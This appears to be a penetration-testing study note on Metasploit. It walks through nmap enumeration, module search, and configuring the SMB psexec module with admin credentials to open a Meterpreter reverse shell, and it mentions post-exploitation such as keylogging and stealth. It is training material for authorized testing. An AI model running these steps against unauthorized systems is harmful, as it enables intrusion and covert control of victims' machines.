# Metasploit: Automated Payload Delivery & Exploitation

Metasploit is an automated framework used to streamline **vulnerability exploitation** through pre-built modules and integrated payloads. Understanding the specific effects and configurations of these tools is critical to avoid destructive outcomes during live engagements.

### 1. Initial Enumeration

Before selecting a module, identify the **target Operating System** and **open services** to narrow down the attack vector.

|Command|Purpose|
|:--|:--|
|`nmap -sC -sV -Pn <TARGET_IP>`|Identify services, versions, and OS fingerprints to select an appropriate module.|

### 2. Framework Initialization & Module Discovery

Once a target service (e.g., **SMB/445**) is identified, search the framework for matching exploits or auxiliary modules.

**Workflow:**

1. **Launch** the framework console as root.
2. **Search** for modules related to the target service.
3. **Analyze** search results based on **Rank** (e.g., "excellent") and **Disclosure Date** to select the most reliable option.

|Command|Description|
|:--|:--|
|`sudo msfconsole`|Launches the Metasploit Framework console.|
|`search <SERVICE_OR_CVE>`|Searches for modules associated with a specific service (e.g., `search smb`).|
|`use <INDEX_OR_PATH>`|Selects a module by its table index or full path.|

### 3. Module Configuration

After selecting a module, you must configure environment-specific parameters. Modules often default to a **Meterpreter reverse TCP shell**, which uses in-memory DLL injection for stealth.

**Operational Context: `exploit/windows/smb/psexec`** Use this module when you have **valid administrator credentials** (username and password/hash) and want to execute an arbitrary payload similarly to the SysInternals `psexec` utility.

|Parameter|Required|Description|
|:--|:--|:--|
|`RHOSTS`|Yes|The **target machine** IP address or range.|
|`RPORT`|Yes|The target service port (Default: 445 for SMB).|
|`LHOST`|Yes|Your **attack machine** IP address (VPN interface) for the reverse connection.|
|`LPORT`|Yes|The local port on your attack machine to listen for the shell.|
|`SMBUser`|No/Yes*|The username for authentication.|
|`SMBPass`|No/Yes*|The password or hash for the specified user.|
|`SHARE`|No|The administrative share to upload the payload (e.g., `ADMIN$`).|

_*Required for authenticated exploits like psexec._

**Configuration Commands:**

1. Review required settings: `options`.
2. Assign values: `set <PARAMETER> <VALUE>`.

```
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS <TARGET_IP>
msf6 exploit(...) > set LHOST <ATTACK_IP>
msf6 exploit(...) > set SMBUser <USERNAME>
msf6 exploit(...) > set SMBPass <PASSWORD>
```

### 4. Exploitation and Interaction

Executing the module initiates the **handler** on your attack machine and delivers the payload to the target.

**Workflow:**

1. Run the exploit: `exploit` or `run`.
2. Monitor the **staging process**; a successful "stage sent" indicates the Meterpreter session is opening.
3. Interact with the **Meterpreter shell** to perform post-exploitation tasks (keylogging, file management, process manipulation).

|Command|Action|
|:--|:--|
|`exploit`|Launches the attack and starts the payload handler.|
|`?`|Within Meterpreter: Displays available post-exploitation commands.|
|`shell`|Within Meterpreter: Drops into a **native system-level shell** (e.g., `cmd.exe`) to use OS-specific commands.|

### Attack Implications

- **Stealth:** Meterpreter operates in-memory, making it harder to detect than traditional disk-based payloads.
- **System Access:** Successful execution of `psexec` typically grants **system-level privileges**.
- **Cleanup:** Modern Metasploit `psexec` modules are designed to clean up the service created on the target system after execution.